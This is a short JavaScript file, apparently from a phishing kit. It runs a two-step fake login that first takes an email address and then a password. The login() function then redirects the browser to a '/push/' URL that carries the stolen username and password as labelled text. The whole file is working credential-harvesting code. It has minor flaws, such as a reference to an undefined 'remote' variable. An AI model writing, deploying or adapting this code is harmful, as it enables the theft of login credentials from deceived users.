var username = '';
var password = '';

function next() {
    var email = document.getElementById('in');
    var page_1 = document.getElementById('page_1');
    page_1.style.display='none';

    var page_2 = document.getElementById('page_2');
    page_2.style.display = 'block';
    var email_show = document.getElementById('email');
    email_show.innerText = email.innerText;

    username = email.value;
}

function login() {
    var pwd = document.getElementById('password');
    password = pwd.value;

    var url = window.location.href;
    window.location.href = String('/push/'+url.substring(remote.length)+'/[-] UserName: ' + username +" [-] Passwd: " + password).replace('//','/')
}